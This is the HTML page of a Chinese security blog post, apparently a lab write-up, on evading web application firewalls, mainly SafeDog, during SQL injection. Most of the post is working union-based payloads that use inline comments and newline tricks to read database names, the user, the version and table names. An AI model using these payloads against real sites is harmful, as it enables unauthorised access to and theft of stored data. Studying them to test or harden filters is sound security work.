@@ -1,0 +1,585 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="WAF绕过">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WAF绕过">
+<meta property="og:url" content="http://example.com/2021/09/30/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/WAF%E7%BB%95%E8%BF%87/index.html">
+<meta property="og:site_name" content="xf&#39;s blog">
+<meta property="og:description" content="WAF绕过">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2021/09/30/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/WAF%E7%BB%95%E8%BF%87/image-20210930094336619.png">
+<meta property="og:image" content="http://example.com/2021/09/30/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/WAF%E7%BB%95%E8%BF%87/image-20210930094711935.png">
+<meta property="og:image" content="http://example.com/2021/09/30/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/WAF%E7%BB%95%E8%BF%87/image-20210930095035926.png">
+<meta property="og:image" content="http://example.com/2021/09/30/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/WAF%E7%BB%95%E8%BF%87/image-20210930095900359.png">
+<meta property="og:image" content="http://example.com/2021/09/30/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/WAF%E7%BB%95%E8%BF%87/image-20210930095959839.png">
+<meta property="og:image" content="http://example.com/2021/09/30/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/WAF%E7%BB%95%E8%BF%87/image-20210930101752799.png">
+<meta property="og:image" content="http://example.com/2021/09/30/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/WAF%E7%BB%95%E8%BF%87/image-20210930102239902.png">
+<meta property="og:image" content="http://example.com/2021/09/30/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/WAF%E7%BB%95%E8%BF%87/image-20210930102835655.png">
+<meta property="og:image" content="http://example.com/2021/09/30/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/WAF%E7%BB%95%E8%BF%87/image-20210930105040261.png">
+<meta property="og:image" content="http://example.com/2021/09/30/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/WAF%E7%BB%95%E8%BF%87/image-20210930105129769.png">
+<meta property="og:image" content="http://example.com/2021/09/30/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/WAF%E7%BB%95%E8%BF%87/image-20210930105313589.png">
+<meta property="og:image" content="http://example.com/2021/09/30/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/WAF%E7%BB%95%E8%BF%87/image-20210930105808165.png">
+<meta property="og:image" content="http://example.com/2021/09/30/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/WAF%E7%BB%95%E8%BF%87/image-20210930173706798.png">
+<meta property="og:image" content="http://example.com/2021/09/30/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/WAF%E7%BB%95%E8%BF%87/image-20210930174713158.png">
+<meta property="og:image" content="http://example.com/2021/09/30/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/WAF%E7%BB%95%E8%BF%87/image-20210930175703753.png">
+<meta property="article:published_time" content="2021-09-30T11:14:12.000Z">
+<meta property="article:modified_time" content="2021-09-30T11:14:29.165Z">
+<meta property="article:author" content="xf">
+<meta property="article:tag" content="sql注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/09/30/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/WAF%E7%BB%95%E8%BF%87/image-20210930094336619.png">
+
+
+<link rel="canonical" href="http://example.com/2021/09/30/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/WAF%E7%BB%95%E8%BF%87/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2021/09/30/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/WAF%E7%BB%95%E8%BF%87/","path":"2021/09/30/web安全/SQL注入篇/WAF绕过/","title":"WAF绕过"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>WAF绕过 | xf's blog</title>
+  
+
+  <script src="/js/third-party/analytics/baidu-analytics.js"></script>
+  <script async src="https://hm.baidu.com/hm.js?50383950ce261bfae047ef555de05e48"></script>
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">xf's blog</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1%EF%BC%89WAF%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.</span> <span class="nav-text">1）WAF介绍</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2%EF%BC%89%E5%B8%B8%E7%94%A8%E7%9A%84%E7%BB%95%E8%BF%87%E6%89%8B%E6%AE%B5"><span class="nav-number">2.</span> <span class="nav-text">2）常用的绕过手段</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-and-or-%E8%A2%AB%E8%BF%87%E6%BB%A4-%E6%8B%A6%E6%88%AA"><span class="nav-number">2.1.</span> <span class="nav-text">1.and&#x2F;or 被过滤&#x2F;拦截</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E7%A9%BA%E6%A0%BC%E8%A2%AB%E8%BF%87%E6%BB%A4-%E6%8B%A6%E6%88%AA"><span class="nav-number">2.2.</span> <span class="nav-text">2.空格被过滤&#x2F;拦截</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E9%80%97%E5%8F%B7%E8%A2%AB%E8%BF%87%E6%BB%A4-%E6%8B%A6%E6%88%AA"><span class="nav-number">2.3.</span> <span class="nav-text">3.逗号被过滤&#x2F;拦截</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E5%85%B6%E4%BB%96%E7%B3%BB%E7%BB%9F%E5%85%B3%E9%94%AE%E5%AD%97%E8%A2%AB%E8%BF%87%E6%BB%A4-%E6%8B%A6%E6%88%AA"><span class="nav-number">2.4.</span> <span class="nav-text">4.其他系统关键字被过滤&#x2F;拦截</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3%EF%BC%89%E7%BB%95%E7%8B%97%E6%A1%88%E4%BE%8B"><span class="nav-number">3.</span> <span class="nav-text">3）绕狗案例</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E8%8E%B7%E5%8F%96%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="nav-number">3.1.</span> <span class="nav-text">1.获取注入点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5%E6%95%B0"><span class="nav-number">3.2.</span> <span class="nav-text">2.获取字段数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E4%BD%BF%E7%94%A8%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="nav-number">3.3.</span> <span class="nav-text">3.使用联合查询</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E8%8E%B7%E5%8F%96%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="nav-number">3.4.</span> <span class="nav-text">4.获取基本信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-%E8%8E%B7%E5%8F%96%E5%AF%B9%E5%BA%94%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E8%A1%A8%E5%90%8D"><span class="nav-number">3.5.</span> <span class="nav-text">5.获取对应数据库的表名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-%E8%8E%B7%E5%8F%96%E5%AF%B9%E5%BA%94%E8%A1%A8%E7%9A%84%E5%AD%97%E6%AE%B5%E4%BF%A1%E6%81%AF"><span class="nav-number">3.6.</span> <span class="nav-text">6.获取对应表的字段信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-%E8%8E%B7%E5%8F%96%E5%AF%B9%E5%BA%94%E8%A1%A8%E7%9A%84%E4%BF%A1%E6%81%AF"><span class="nav-number">3.7.</span> <span class="nav-text">7.获取对应表的信息</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#4%EF%BC%89%E7%BB%95%E7%8B%97%E6%89%A9%E5%B1%95-%E6%8A%A5%E9%94%99%EF%BC%8C%E7%9B%B2%E6%B3%A8"><span class="nav-number">4.</span> <span class="nav-text">4）绕狗扩展(报错，盲注)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E6%8A%A5%E9%94%99"><span class="nav-number">4.1.</span> <span class="nav-text">1.报错</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E7%9B%B2%E6%B3%A8"><span class="nav-number">4.2.</span> <span class="nav-text">2.盲注</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="xf"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">xf</p>
+  <div class="site-description" itemprop="description">xf@github.io</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">15</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/09/30/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/WAF%E7%BB%95%E8%BF%87/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="xf">
+      <meta itemprop="description" content="xf@github.io">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xf's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          WAF绕过
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2021-09-30 19:14:12 / 修改时间：19:14:29" itemprop="dateCreated datePublished" datetime="2021-09-30T19:14:12+08:00">2021-09-30</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>WAF绕过</p>
+<span id="more"></span>
+<h1 id="1）WAF介绍"><a href="#1）WAF介绍" class="headerlink" title="1）WAF介绍"></a>1）WAF介绍</h1><p>Web应用防护系统（也称为：<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%BD%91%E7%AB%99/155722">网站</a>应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%9B%BD%E9%99%85/766689">国际</a>上公认的一种说法：Web应用<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E9%98%B2%E7%81%AB%E5%A2%99">防火墙</a>是通过执行一系列针对HTTP/HTTPS的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5/2890163">安全策略</a>来专门为<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Web/150564">Web</a>应用提供保护的一款产品。</p>
+<blockquote>
+<p>waf与防火墙的区别</p>
+</blockquote>
+<p>​    网络防火墙作为访问控制设备，主要工作在OSI模型三、四层，基于IP报文进行检测。只是对端口做限制，对TCP协议做封堵。产品设计无需理解HTTP会话，也就决定了无法理解Web应用程序语言如HTML、SQL语言。因此，它不可能对HTTP通讯进行输入验证或攻击规则分析。针对Web网站的恶意攻击绝大部分都将封装为HTTP请求,从80或443端口顺利通过防火墙检测。</p>
+<blockquote>
+<p>分类</p>
+</blockquote>
+<ul>
+<li>硬件设备类(绿盟、启明、安恒、知道创宇、天融信等)</li>
+<li>软件产品类(安全狗、云锁、D盾等)</li>
+<li>基于云的WAF (阿里云、安恒、知道创宇)</li>
+</ul>
+<blockquote>
+<p>探测</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">工具：github.com/EnableSecurity/wafw00f</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>X-Powered-By:WAF</strong>    少部分waf会有这个标志，在响应头中</li>
+</ul>
+<h1 id="2）常用的绕过手段"><a href="#2）常用的绕过手段" class="headerlink" title="2）常用的绕过手段"></a>2）常用的绕过手段</h1><p>1、使用特殊字符(Ascii码不在32- 127范围内)<br>2、使用特殊语法(非常规的SQL注入语句)<br>3、使用超长数据(超长的数据安全狗无法处理)<br>4、利用安全狗的白名单策略(借助安全狗的白名单逆袭)<br>5、利用操作系统特性(利用非安全狗防护策略的特性完成逆袭)<br>6、其它的一些手段或是以上方法的结合(一些其它的技巧)</p>
+<h2 id="1-and-or-被过滤-拦截"><a href="#1-and-or-被过滤-拦截" class="headerlink" title="1.and/or 被过滤/拦截"></a>1.and/or 被过滤/拦截</h2><ul>
+<li>双写<code>anandd、oorr</code></li>
+<li>使用运算符代替<code>&amp;&amp;、||</code></li>
+<li>直接拼接<code>=</code>号，如：<code>?id=1=(condition)</code></li>
+<li>其他方法，如：<code>?id=1^(condition)</code></li>
+</ul>
+<h2 id="2-空格被过滤-拦截"><a href="#2-空格被过滤-拦截" class="headerlink" title="2.空格被过滤/拦截"></a>2.空格被过滤/拦截</h2><ul>
+<li>多层括号嵌套<ul>
+<li><code>where(password=123/**/and(isDeleted=1))</code></li>
+</ul>
+</li>
+<li>改用<code>+</code>号<ul>
+<li><code>get</code>请求空格都可以修改</li>
+<li>其他请求只有部分空格可以，因为会带入数据库进行执行</li>
+</ul>
+</li>
+<li>使用注释代替<ul>
+<li><code>/*!*/</code></li>
+<li><code>/**/</code></li>
+</ul>
+</li>
+<li><code>and/or</code>后面可以跟上偶数个<code>!、~</code>可以替代空格，也可以混合使用(规律又不同)<ul>
+<li><code>and~~1</code></li>
+<li><code>and~~1=1</code></li>
+<li><code>and!!!1</code></li>
+<li><code>and!!!!~~1</code></li>
+</ul>
+</li>
+<li><code>%09, %0a, %0b, %0c, %0d, %a0,%20</code>等部分不可见字符可也代替空格<ul>
+<li><code>%09</code>-&gt;<code>tab键</code></li>
+<li><code>%0a</code>-&gt;<code>换行</code></li>
+<li><code>%0b,%0c,%0d,%a0</code>-&gt;<code>一些特殊字符</code></li>
+<li><code>%20</code>-&gt;<code>空格</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="3-逗号被过滤-拦截"><a href="#3-逗号被过滤-拦截" class="headerlink" title="3.逗号被过滤/拦截"></a>3.逗号被过滤/拦截</h2><ul>
+<li>改用盲注</li>
+<li>使用join语句代替</li>
+<li><code>substr(data from 1 for 1)</code>相当于<code>substr(data,1,1)</code>、<code>limit 9 offset 4</code>相当于<code>limt 9,4</code></li>
+</ul>
+<h2 id="4-其他系统关键字被过滤-拦截"><a href="#4-其他系统关键字被过滤-拦截" class="headerlink" title="4.其他系统关键字被过滤/拦截"></a>4.其他系统关键字被过滤/拦截</h2><ul>
+<li>双写绕过关键字过滤</li>
+<li>使用同义函数/语句代替，如if函数可用<code>case when condition then 1 else 0 end</code>语句代替。</li>
+</ul>
+<h1 id="3）绕狗案例"><a href="#3）绕狗案例" class="headerlink" title="3）绕狗案例"></a>3）绕狗案例</h1><h2 id="1-获取注入点"><a href="#1-获取注入点" class="headerlink" title="1.获取注入点"></a>1.获取注入点</h2><p>正常回显：</p>
+<img src="/2021/09/30/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/WAF%E7%BB%95%E8%BF%87/image-20210930094336619.png" class="">
+
+<p>进行fuzz，当使用<code>?id=1&#39;</code>获取到<code>SQL语句</code></p>
+<img src="/2021/09/30/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/WAF%E7%BB%95%E8%BF%87/image-20210930094711935.png" class="">
+
+<p>所以可以获取到注入点，可以构造一个<code>payload:    ?id=1&#39; ?? -- x</code></p>
+<h2 id="2-获取字段数"><a href="#2-获取字段数" class="headerlink" title="2.获取字段数"></a>2.获取字段数</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--	使用order by进行获取</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by ? -- x</span></span><br></pre></td></tr></table></figure>
+
+<p>发现直接被WAF拦截了。</p>
+<img src="/2021/09/30/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/WAF%E7%BB%95%E8%BF%87/image-20210930095035926.png" class="">
+
+<p>通过fuzz，获取到</p>
+<ul>
+<li><code>order</code>不拦截</li>
+<li><code>by</code>不拦截</li>
+<li><code>order by x</code>拦截</li>
+<li><code>order by</code>拦截</li>
+</ul>
+<p>根据规则说明我们需要在<code>order by</code>中间加上绕过字符串。</p>
+<p>方式一：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 使用内联注释去绕过 内联注释个数不固定，1个不行就2个，慢慢加</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order /*!66666aa*/ by ?? -- x</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2021/09/30/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/WAF%E7%BB%95%E8%BF%87/image-20210930095900359.png" class="">
+
+<p>方式二：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 使用注释干扰 /*//--/*/  一个绕狗新方法</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order /*//--/*/ by 1 -- x</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2021/09/30/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/WAF%E7%BB%95%E8%BF%87/image-20210930095959839.png" class="">
+
+<p>获取到字段数：<code>3</code></p>
+<blockquote>
+<p>内联注释解析</p>
+</blockquote>
+<ul>
+<li>语法：<code>/*! ?? */</code>，里面的<code>??</code>可以替换为任何内容</li>
+<li>当里面的内容为非<strong>版本号</strong>时，那么它将不会起到注释作用，会将里面的内容识别为语句的一部分<ul>
+<li><strong>版本号</strong>，必须在<code>10000-99999</code>之间的数值才是版本号</li>
+<li>在<code>5.x</code>版本中，只要出现了版本号，那么后面的内容也会被注释，如：<code>/*!66666aa*/</code>，里面<code>aa</code>也会被注释</li>
+<li>在<code>8.x</code>版本中，只会将版本号给注释，不会注释后面的内容</li>
+</ul>
+</li>
+<li>嵌套使用<ul>
+<li><code>/*! ?? /*! ?? */</code></li>
+<li>嵌套使用算多块，每一块被注释了并不会影响到其他的</li>
+</ul>
+</li>
+</ul>
+<h2 id="3-使用联合查询"><a href="#3-使用联合查询" class="headerlink" title="3.使用联合查询"></a>3.使用联合查询</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--基本使用</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,2,3 -- x</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2021/09/30/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/WAF%E7%BB%95%E8%BF%87/image-20210930101752799.png" class="">
+
+<p>被拦截了。使用fuzz，获取到：</p>
+<ul>
+<li><code>union</code>不拦截</li>
+<li><code>union select</code>拦截</li>
+<li><code>select xx</code>不拦截</li>
+</ul>
+<p>根据fuzz那么就可以获取到 只用在union 与 select之前加上过滤符即可</p>
+<p>方式一：<code>?id=-1&#39; union /*//--/*/select 1,2,3 -- x</code></p>
+<p>​    或者使用布尔进行联合<code>?id=1&#39; and /*//--/*/1=2 union /*//--/*/select 1,2,3 -- x</code></p>
+<img src="/2021/09/30/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/WAF%E7%BB%95%E8%BF%87/image-20210930102239902.png" class="">
+
+<p>方式二，使用换行进行绕过：<code>?id=-1&#39; union/*!-- x/*%0aselect/*!1,2,3*/ -- x</code>。<code>%0a</code>就是换行符，所以在其之前的注释失效了。</p>
+<img src="/2021/09/30/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/WAF%E7%BB%95%E8%BF%87/image-20210930102835655.png" class="">
+
+<h2 id="4-获取基本信息"><a href="#4-获取基本信息" class="headerlink" title="4.获取基本信息"></a>4.获取基本信息</h2><p>一般需要获取<code>user()、database()</code>，经过fuzz获取：</p>
+<ul>
+<li><code>database()</code>拦截</li>
+<li><code>user()</code>拦截</li>
+</ul>
+<p>所以我们需要在函数名与()直接插入过滤符</p>
+<p>方式一：<code>?id=-1&#39; union /*//--/*/   select 1,2,database /*//--/*/ ()  --+</code></p>
+<img src="/2021/09/30/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/WAF%E7%BB%95%E8%BF%87/image-20210930105040261.png" class="">
+
+<p>方式二，使用内联绕过：<code>?id=-1&#39; union /*//--/*/   select 1,2,database/*!80000aa*//*!80000aa*/ ()  --+</code></p>
+<img src="/2021/09/30/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/WAF%E7%BB%95%E8%BF%87/image-20210930105129769.png" class="">
+
+<p>方式三，使用换行绕过：<code>?id=-1&#39; union /*//--/*/   select 1,2,database/*!--+/*%0a/*!()*/  --+</code></p>
+<img src="/2021/09/30/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/WAF%E7%BB%95%E8%BF%87/image-20210930105313589.png" class="">
+
+<p>获取**user()**同理。</p>
+<blockquote>
+<p>获取version</p>
+</blockquote>
+<p>目前仅测出一种方法，通过2个换行：<code>?id=-1&#39; union /*//--/*/   select 1,2,/*!--+/*%0aversion*//*!--+/*%0a/*!()*/  --+</code></p>
+<img src="/2021/09/30/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/WAF%E7%BB%95%E8%BF%87/image-20210930105808165.png" class="">
+
+<h2 id="5-获取对应数据库的表名"><a href="#5-获取对应数据库的表名" class="headerlink" title="5.获取对应数据库的表名"></a>5.获取对应数据库的表名</h2><p>通过内联注释以及换行获取对应的数据库的所有表名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- payload</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union /*//--/*/ select 1,2,group_concat(table_name) /*//--/*/ from /*!--+/*%0a/*!information_schema.tables*/ where table_schema=&#x27;</span>security<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2021/09/30/web%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5%E7%AF%87/WAF%E7%BB%95%E8%BF%87/image-20210930173706798.png" class="">
+
